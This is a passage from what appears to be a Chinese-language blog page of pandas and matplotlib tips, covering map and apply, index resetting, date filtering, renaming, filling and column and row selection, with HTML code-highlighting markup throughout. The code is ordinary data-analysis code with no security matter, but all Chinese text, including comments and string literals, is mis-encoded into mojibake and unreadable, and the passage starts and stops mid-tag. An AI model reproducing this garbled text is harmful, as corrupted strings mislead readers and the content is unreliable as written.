‘çš„å½¢å¼è¿›è¡Œï¼ˆé‡æ–°ä½¿ç”¨ä¸Šä¸€æ¬¡çš„è°ƒç”¨ä½œä¸ºåˆå§‹åŒ–ï¼‰ã€‚</p></li><li><p>n_jobsï¼šå¹¶è¡Œæ•°ã€‚intç±»å‹ï¼Œé»˜è®¤ä¸º1ã€‚1çš„æ—¶å€™ï¼Œç”¨CPUçš„ä¸€ä¸ªå†…æ ¸è¿è¡Œç¨‹åºï¼Œ2çš„æ—¶å€™ï¼Œç”¨CPUçš„2ä¸ªå†…æ ¸è¿è¡Œç¨‹åºã€‚ä¸º-1çš„æ—¶å€™ï¼Œç”¨æ‰€æœ‰CPUçš„å†…æ ¸è¿è¡Œç¨‹åºã€‚</p></li></ul><h2><span id="åšé¢˜é‡åˆ°çš„">åšé¢˜é‡åˆ°çš„</span></h2><h3><span id="æ•°æ®æ ¼å¼åŒ–map">æ•°æ®æ ¼å¼åŒ–map</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å°† df2 çš„è·å¥–æ—¶é—´æ ¼å¼åŒ–ä¸º xæœˆxæ—¥</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">time_format</span>(<span class="params">x</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> x.strftime(<span class="string">&quot;%mæœˆ%dæ—¥&quot;</span>)</span><br><span class="line"></span><br><span class="line">df2[<span class="string">&#x27;è·å¥–æ—¶é—´&#x27;</span>] = df2[<span class="string">&#x27;è·å¥–æ—¶é—´&#x27;</span>].<span class="built_in">map</span>(time_format)</span><br><span class="line"><span class="comment"># ç­‰åŒäº</span></span><br><span class="line">df2.è·å¥–æ—¶é—´.<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x.strftime(<span class="string">&#x27;%mæœˆ%dæ—¥&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">turn_percentage</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%.2f%%&#x27;</span> % (x * <span class="number">100</span>);</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">q1_df[<span class="string">&#x27;AT_HOME&#x27;</span>]=q1_df[<span class="string">&#x27;AT_HOME&#x27;</span>].apply(turn_percentage)</span><br><span class="line">q1_df[<span class="string">&#x27;AT_HOME&#x27;</span>]=q1_df[<span class="string">&#x27;AT_HOME&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="string">&quot;&#123;:.2%&#125;&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ˜¾ç¤ºå°æ•°</span></span><br><span class="line">pd.set_option(<span class="string">&#x27;precision&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># mapä¼ å­—å…¸</span></span><br><span class="line">df1[<span class="string">&#x27;A&#x27;</span>] = df1[<span class="string">&#x27;A&#x27;</span>].<span class="built_in">map</span>(&#123;<span class="string">&#x27;A0&#x27;</span>:<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;A3&#x27;</span>:<span class="string">&#x27;rabbit&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># map ignore</span></span><br><span class="line">df1[<span class="string">&#x27;B&#x27;</span>] = df1[<span class="string">&#x27;B&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> x:<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span> ä»Šå¤©å…³æ³¨äº†æ—©èµ·Python&#x27;</span>, na_action=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#applymapå¯ä»¥å¯¹æ•´ä¸ª dataframe å·¥ä½œï¼Œç°åœ¨å°† df1 çš„æœ€åä¸‰åˆ—ä¿ç•™ä¸¤ä½å°æ•°</span></span><br><span class="line"></span><br><span class="line">df1[[<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>]] = df1[[<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>]].applymap(<span class="keyword">lambda</span> x:<span class="built_in">format</span>(x,<span class="string">&#x27;.2f&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="ç´¢å¼•">ç´¢å¼•</span></h3><ul><li><code>reset_index</code>ç”¨äºå°†ç´¢å¼•è¿˜åŸæˆé»˜è®¤å€¼ï¼Œå³ä»0å¼€å§‹æ­¥é•¿ä¸º1çš„æ•°ç»„ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">q1_df[<span class="string">&#x27;rate&#x27;</span>] = [x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(q1_df[<span class="string">&#x27;AT_HOME&#x27;</span>])+<span class="number">1</span>)]</span><br><span class="line"><span class="comment"># å¦‚æœç´¢å¼•ä¸æ˜¯é»˜è®¤</span></span><br><span class="line">q1_df.reset_index().set_index(q1_df[<span class="string">&#x27;rate&#x27;</span>])</span><br><span class="line"><span class="comment"># å¦‚æœæ˜¯é»˜è®¤</span></span><br><span class="line">q1_df.set_index(q1_df[<span class="string">&#x27;rate&#x27;</span>],inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># åˆ é™¤ç´¢å¼•</span></span><br><span class="line">max_data=max_data.reset_index(drop=<span class="literal">True</span>).set_index(max_data[<span class="string">&#x27;DATA_DATE&#x27;</span>])</span><br><span class="line"><span class="comment"># ä¿®æ”¹ç´¢å¼•å</span></span><br><span class="line">df.rename_axis([<span class="string">&quot;è¡Œæ”¿åŒº&quot;</span>, <span class="string">&quot;å…¬å¸è§„æ¨¡&quot;</span>],inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3><span id="åæ ‡è½´æ˜¾ç¤ºç™¾åˆ†æ¯”">åæ ‡è½´æ˜¾ç¤ºç™¾åˆ†æ¯”</span></h3><ul><li>ç¬¬ä¸€ç§æ–¹æ³•</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib.ticker <span class="keyword">import</span> FuncFormatter</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_percent</span>(<span class="params">temp, position</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%1.0f&#x27;</span>%(<span class="number">100</span>*temp) + <span class="string">&#x27;%&#x27;</span></span><br><span class="line">plt.gca().yaxis.set_major_formatter(FuncFormatter(to_percent))</span><br></pre></td></tr></table></figure><ul><li>æ¨è</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ax.set_yticklabels([<span class="string">&#x27;0%&#x27;</span>,<span class="string">&#x27;10%&#x27;</span>,<span class="string">&#x27;20%&#x27;</span>,<span class="string">&#x27;30%&#x27;</span>,<span class="string">&#x27;40%&#x27;</span>,<span class="string">&#x27;50%&#x27;</span>])</span><br></pre></td></tr></table></figure><h3><span id="apply">apply</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ„å»ºapplyå‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge_state</span>(<span class="params">row</span>):</span><br><span class="line">    <span class="keyword">if</span> row[<span class="string">&#x27;Austin - EV&#x27;</span>] &lt;=<span class="number">0.01</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Off&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> row[<span class="string">&#x27;Austin - EV&#x27;</span>]&gt;<span class="number">0.01</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;On&#x27;</span></span><br><span class="line"><span class="comment"># åº”ç”¨applyå‡½æ•°</span></span><br><span class="line">df_Austin_ev = df.apply(judge_state,axis = <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿ç•™2ä½å°æ•°ï¼Œå¦‚23.12%</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">turn_percentage</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%.2f%%&#x27;</span> % (x * <span class="number">100</span>)</span><br><span class="line"><span class="comment"># åº”ç”¨è‡ªå®šä¹‰å‡½æ•°</span></span><br><span class="line">ratio=ratio[<span class="string">&#x27;Austin - EV&#x27;</span>].apply(turn_percentage)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æˆ‘ä»¬å°†ä¼šç”¨åˆ° transform è€Œä¸æ˜¯ applyã€‚ åŸå› æ˜¯ï¼Œ transform å°†ä¼šä¿æŒ dataframe çŸ©é˜µçš„å½¢çŠ¶(shape)(å°±æ˜¯è¡Œåˆ—æ•°ä¸å˜)è€Œ apply ä¼šæ”¹å˜çŸ©é˜µçš„å½¢çŠ¶ã€‚</span></span><br></pre></td></tr></table></figure><h3><span id="é‡é‡‡æ ·">é‡é‡‡æ ·</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é‡é‡‡æ ·</span></span><br><span class="line">df[<span class="string">&#x27;è´­ä¹°æœˆä»½&#x27;</span>] = pd.to_datetime(df.æ—¥æœŸ).dt.to_period(<span class="string">&quot;M&quot;</span>)</span><br></pre></td></tr></table></figure><h3><span id="del">del</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> df[<span class="string">&#x27;a&#x27;</span>]</span><br><span class="line"><span class="comment"># ç­‰ä»·äº</span></span><br><span class="line">df.drop(<span class="string">&#x27;a&#x27;</span>,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3><span id="æŒ‰æ—¶é—´ç­›é€‰">æŒ‰æ—¶é—´ç­›é€‰</span></h3><ul><li>ç¬¬ä¸€ç§</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å°†DateTimeè½¬æˆæ—¥æœŸæ ¼å¼</span></span><br><span class="line">df[<span class="string">&#x27;DateTime&#x27;</span>] = pd.to_datetime(df[<span class="string">&#x27;DateTime&#x27;</span>])</span><br><span class="line"><span class="comment"># å°†æ—¥æœŸè®¾ä¸ºindex</span></span><br><span class="line">df = df.set_index(<span class="string">&#x27;DateTime&#x27;</span>)</span><br><span class="line"><span class="comment"># ç­›é€‰ä»2019å¹´3æœˆ1å·åˆ°2019å¹´3æœˆ10å·æ•´åå¤©çš„ç”µç½‘æ•°æ®</span></span><br><span class="line">df1 = df[<span class="string">&#x27;2019-03-01&#x27;</span>:<span class="string">&#x27;2019-03-10&#x27;</span>]</span><br></pre></td></tr></table></figure><ul><li>ç¬¬äºŒç§<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># è®¾ç½®å¼€å§‹æ—¶é—´</span><br><span class="line">from_date = df[&#x27;DATA_DATE&#x27;]&gt;=&#x27;2021-01-01&#x27;</span><br><span class="line"># è®¾ç½®ç»“æŸæ—¶é—´</span><br><span class="line">to_date = df[&#x27;DATA_DATE&#x27;]&lt;=&#x27;2021-03-31&#x27;</span><br><span class="line"># ç­›é€‰æ•°æ®æ—¶é—´æ®µ</span><br><span class="line">df = df[from_date&amp;to_date]</span><br></pre></td></tr></table></figure></li></ul><h3><span id="æ˜¾ç¤ºä¸­æ–‡">æ˜¾ç¤ºä¸­æ–‡</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># winè®¾ç½®ä¸­æ–‡</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>]=[<span class="string">&#x27;SimHei&#x27;</span>] <span class="comment">#ç”¨æ¥æ­£å¸¸æ˜¾ç¤ºä¸­æ–‡æ ‡ç­¾</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span> <span class="comment">#ç”¨æ¥æ­£å¸¸æ˜¾ç¤ºè´Ÿå·</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># macè®¾ç½®ä¸­æ–‡</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.family&#x27;</span>] = <span class="string">&#x27;Heiti TC&#x27;</span><span class="comment">#ç”¨æ¥æ­£å¸¸æ˜¾ç¤ºä¸­æ–‡æ ‡ç­¾</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span> <span class="comment">#ç”¨æ¥æ­£å¸¸æ˜¾ç¤ºè´Ÿå·</span></span><br></pre></td></tr></table></figure><h3><span id="é‡å‘½å">é‡å‘½å</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é‡å‘½å åˆ—</span></span><br><span class="line">q4_df.rename(columns=&#123;<span class="string">&#x27;AT_HOME&#x27;</span>:<span class="string">&#x27;empty_ratio&#x27;</span>&#125;,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># é‡å‘½å ç´¢å¼•</span></span><br><span class="line">df.rename_axis(<span class="string">&quot;é‡‘ç‰Œæ’å&quot;</span>,inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3><span id="å¡«å……">å¡«å……</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">bfill ä»åé¢å¾€å‰å¡«å……</span></span><br><span class="line"><span class="string">ffill ä»å‰å¾€å</span></span><br><span class="line"><span class="string">é»˜è®¤åˆ—æ–¹å‘å¡«å……0ï¼Œ1ä½¿ç”¨è¡Œæ–¹å‘</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–°å¢ä¸€åˆ— æœ€å¤šå¥–ç‰Œæ•°é‡ åˆ—ï¼Œå€¼ä¸ºè¯¥å›½ é‡‘ã€é“¶ã€é“œ ç‰Œæ•°é‡ä¸­æœ€å¤šçš„ä¸€ä¸ªå¥–ç‰Œæ•°é‡</span></span><br><span class="line">df[<span class="string">&#x27;æœ€å¤šå¥–ç‰Œæ•°é‡&#x27;</span>] = df.bfill(<span class="number">1</span>)[[<span class="string">&quot;é‡‘ç‰Œæ•°&quot;</span>, <span class="string">&quot;é“¶ç‰Œæ•°&quot;</span>,<span class="string">&#x27;é“œç‰Œæ•°&#x27;</span>]].<span class="built_in">max</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3><span id="æŸ¥è¯¢">æŸ¥è¯¢</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŸ¥è¯¢</span></span><br><span class="line">df.query(<span class="string">&#x27;é‡‘ç‰Œæ•°+é“¶ç‰Œæ•° &gt; 15&#x27;</span>)</span><br><span class="line"></span><br><span class="line">df[df.å›½å®¶å¥¥å§”ä¼š.<span class="built_in">str</span>.contains(<span class="string">&#x27;å›½&#x27;</span>)]</span><br><span class="line"></span><br><span class="line">df_01.loc[df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>].isin([<span class="string">&#x27;å·¥ä¸š&#x27;</span>,<span class="string">&#x27;å»ºç­‘ä¸š&#x27;</span>])]</span><br><span class="line">df_01.loc[(df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>]==<span class="string">&#x27;å·¥ä¸š&#x27;</span>)|(df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>]==<span class="string">&#x27;å»ºç­‘ä¸š&#x27;</span>)]</span><br><span class="line">df_01[df_01[<span class="string">&#x27;è¡Œä¸šï¼ˆæŒ‰è¡Œä¸šå¤§ç±»ï¼‰&#x27;</span>].<span class="built_in">str</span>.contains(<span class="string">&#x27;å·¥ä¸š|å»ºç­‘ä¸š&#x27;</span>)]</span><br></pre></td></tr></table></figure><h3><span id="é€‰æ‹©ç±»å‹">é€‰æ‹©ç±»å‹</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df4.select_dtypes(include=[<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;float64&#x27;</span>])</span><br><span class="line">df4.select_dtypes(exclude=[<span class="string">&#x27;int&#x27;</span>,<span class="string">&#x27;float64&#x27;</span>])</span><br></pre></td></tr></table></figure><h3><span id="æ•°æ®å±•å¼€">æ•°æ®å±•å¼€</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df5.explode([<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;C&#x27;</span>])</span><br></pre></td></tr></table></figure><h3><span id="æ•°æ®ç´¯åŠ ">æ•°æ®ç´¯åŠ </span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="built_in">list</span>(<span class="string">&#x27;ABCD&#x27;</span>)].cumsum()</span><br><span class="line">df[<span class="built_in">list</span>(<span class="string">&#x27;ABCD&#x27;</span>)].cumsum(axis = <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3><span id="åˆ—æ“ä½œ">åˆ—æ“ä½œ</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ’å…¥åˆ—</span></span><br><span class="line">tmp3 = (df[<span class="string">&#x27;æ˜¥èŠ‚æœŸé—´ï¼ˆé™¤å¤•è‡³åˆå…­ï¼‰ç”¨ç”µé‡&#x27;</span>]-df[<span class="string">&#x27;èŠ‚å‰æ¸©åº¦æ¥è¿‘çš„ä¸€å‘¨ç”¨ç”µé‡&#x27;</span>])/df[<span class="string">&#x27;èŠ‚å‰æ¸©åº¦æ¥è¿‘çš„ä¸€å‘¨ç”¨ç”µé‡&#x27;</span>]</span><br><span class="line">tmp1 = df.iloc[:,:<span class="number">1</span>]</span><br><span class="line">tmp2 = df.iloc[:,<span class="number">1</span>:]</span><br><span class="line">df = pd.concat([tmp1,tmp3.to_frame(),tmp2],axis=<span class="number">1</span>,ignore_index=<span class="literal">True</span>)</span><br><span class="line">df.columns=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>]</span><br><span class="line">df</span><br><span class="line"><span class="comment"># åˆ é™¤åˆ—</span></span><br><span class="line">df.drop(<span class="string">&#x27;rate&#x27;</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment"># æ–°å¢åˆ—</span></span><br><span class="line">df[<span class="string">&#x27;æ¯”èµ›åœ°ç‚¹&#x27;</span>] = <span class="string">&#x27;ä¸œäº¬&#x27;</span></span><br><span class="line"><span class="comment"># æ–°å¢ä¸€åˆ— æœ€å¤šå¥–ç‰Œæ•°é‡ åˆ—ï¼Œå€¼ä¸ºè¯¥å›½ é‡‘ã€é“¶ã€é“œ ç‰Œæ•°é‡ä¸­æœ€å¤šçš„ä¸€ä¸ªå¥–ç‰Œæ•°é‡ ä¾‹å¦‚ç¾å›½é“¶ç‰Œæœ€å¤šï¼Œåˆ™ä¸º41ï¼Œä¸­å›½ä¸º38 bfillé»˜è®¤è·¨è¡Œå¡«å……</span></span><br><span class="line">df[<span class="string">&#x27;æœ€å¤šå¥–ç‰Œæ•°é‡&#x27;</span>] = df.bfill(<span class="number">1</span>)[[<span class="string">&quot;é‡‘ç‰Œæ•°&quot;</span>, <span class="string">&quot;é“¶ç‰Œæ•°&quot;</span>,<span class="string">&#x27;é“œç‰Œæ•°&#x27;</span>]].<span class="built_in">max</span>(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># å¦‚æœä¸€ä¸ªå›½å®¶çš„é‡‘ç‰Œæ•°å¤§äº 30 åˆ™å€¼ä¸º æ˜¯ï¼Œåä¹‹ä¸º å¦</span></span><br><span class="line">df[<span class="string">&#x27;é‡‘ç‰Œå¤§äº30&#x27;</span>]  = np.where(df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>] &gt; <span class="number">30</span>, <span class="string">&#x27;æ˜¯&#x27;</span>, <span class="string">&#x27;å¦&#x27;</span>)</span><br><span class="line"><span class="comment"># åˆ é™¤ df çš„ 7ã€8ã€9ã€10 åˆ—</span></span><br><span class="line">df.drop(df.columns[[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>]], axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># æå–ç¬¬1ï¼Œ2ï¼Œ3ï¼Œ4åˆ—</span></span><br><span class="line">df.iloc[:,<span class="number">0</span>:<span class="number">4</span>] </span><br><span class="line">df.iloc[:,[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]]</span><br><span class="line"><span class="comment"># æå– é‡‘ç‰Œæ•°ã€é“¶ç‰Œæ•°ã€é“œç‰Œæ•° ä¸‰åˆ—</span></span><br><span class="line">df[[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>,<span class="string">&#x27;é“¶ç‰Œæ•°&#x27;</span>,<span class="string">&#x27;é“œç‰Œæ•°&#x27;</span>]]</span><br><span class="line"><span class="comment"># æå–å…¨éƒ¨åˆ—åä¸­ä»¥ â€œæ•°â€ ç»“å°¾çš„åˆ—</span></span><br><span class="line">df.loc[:, df.columns.<span class="built_in">str</span>.endswith(<span class="string">&#x27;æ•°&#x27;</span>)]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="è¡Œæ“ä½œ">è¡Œæ“ä½œ</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ’å…¥è¡Œ å…ˆåˆ‡åˆ†å†æ’å…¥</span></span><br><span class="line">df1 = df.iloc[:<span class="number">1</span>, :]</span><br><span class="line">df2 = df.iloc[<span class="number">1</span>:, :]</span><br><span class="line">df3 = pd.DataFrame([[i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df.columns))]], columns=df.columns)</span><br><span class="line">df_new = pd.concat([df1, df3, df2], ignore_index=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># åˆ é™¤ç¬¬ä¸€è¡Œ</span></span><br><span class="line">df.drop(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># æ¡ä»¶åˆ é™¤</span></span><br><span class="line">df.drop(df[df.é‡‘ç‰Œæ•°&lt;<span class="number">20</span>].index)</span><br><span class="line"><span class="comment"># æå–å€’æ•°åä¸‰åˆ—çš„10-20è¡Œ</span></span><br><span class="line">df.iloc[<span class="number">10</span>:<span class="number">20</span>,-<span class="number">3</span>:]</span><br><span class="line">df.loc[<span class="number">10</span>:<span class="number">20</span>, <span class="string">&#x27;æ€»åˆ†&#x27;</span>:] </span><br><span class="line"><span class="comment"># æå–ç¬¬ 10 è¡Œ </span></span><br><span class="line"><span class="comment"># DataFrameæ ¼å¼</span></span><br><span class="line">a = df.loc[<span class="number">9</span>:<span class="number">9</span>]</span><br><span class="line"><span class="comment"># Seriesæ ¼å¼</span></span><br><span class="line">a = df.loc[<span class="number">9</span>,:]</span><br><span class="line"><span class="comment"># æå–ç¬¬ 10 è¡Œä¹‹åçš„å…¨éƒ¨è¡Œ</span></span><br><span class="line">df.iloc[<span class="number">9</span>:,]</span><br><span class="line">df.iloc[<span class="number">9</span>:]</span><br><span class="line">df.loc[<span class="number">9</span>:]</span><br><span class="line"><span class="comment"># æå– 0-50 è¡Œï¼Œé—´éš”ä¸º 3</span></span><br><span class="line">df[:<span class="number">50</span>:<span class="number">3</span>]</span><br><span class="line"><span class="comment"># æå– é‡‘ç‰Œæ•° ä¸ç­‰äº 10 çš„è¡Œ</span></span><br><span class="line">df.loc[~(df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>] == <span class="number">10</span>)]</span><br><span class="line"><span class="comment"># æå–å¥‡æ•°è¡Œ</span></span><br><span class="line">df[[i%<span class="number">2</span>==<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(df.index))]]</span><br><span class="line"><span class="comment"># æå– ä¸­å›½ã€ç¾å›½ã€è‹±å›½ã€æ—¥æœ¬ã€å·´è¥¿ äº”è¡Œæ•°æ® ä¸” é‡‘ç‰Œæ•°å°äº30</span></span><br><span class="line">df.loc[(df[<span class="string">&#x27;é‡‘ç‰Œæ•°&#x27;</span>] &lt; <span class="number">30</span>) &amp; (df[<span class="string">&#x27;å›½å®¶å¥¥å§”ä¼š&#x27;</span>].isin([<span class="string">&#x27;ä¸­å›½&#x27;</span>,<span class="string">&#x27;ç¾å›½&#x27;</span>,<span class="string">&#x27;è‹±å›½&#x27;</span>,<span class="string">&#x27;æ—¥æœ¬&#x27;</span>,<span class="string">&#x27;å·´è¥¿&#x27;</span>]))]</span><br><span class="line"><span class="comment"># åŒ…å«æŸä¸ªå­—çš„è¡Œ</span></span><br><span 